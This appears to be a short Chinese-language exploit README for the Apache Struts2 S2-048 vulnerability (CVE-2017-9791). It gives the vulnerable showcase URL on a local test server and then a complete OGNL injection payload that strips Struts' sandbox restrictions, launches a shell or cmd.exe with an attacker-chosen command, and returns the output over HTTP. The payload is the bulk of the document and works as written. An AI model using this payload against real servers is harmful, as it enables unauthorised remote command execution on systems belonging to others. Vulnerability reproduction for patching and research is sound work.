# CVE-2017-9791

Exp for CVE-2017-9791,s2-048

1. 目录

```
http://127.0.0.1:8080/struts2-showcase/integration/saveGangster.action
```

![image-20200513064941797](漏洞复现.assets/image-20200513064941797.png)

2. 输入表达式

![image-20200513065000214](漏洞复现.assets/image-20200513065000214.png)

3. Submit之后可看到运算被后台执行

![image-20200513065026749](漏洞复现.assets/image-20200513065026749.png)

4. 重新提交，修改Gangster Name的值为一下，将执行命令id

```
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```



## 参考网址：

1. [Struts2_048(CVE-2017-9791)远程代码执行漏洞EXP](https://xz.aliyun.com/t/1867)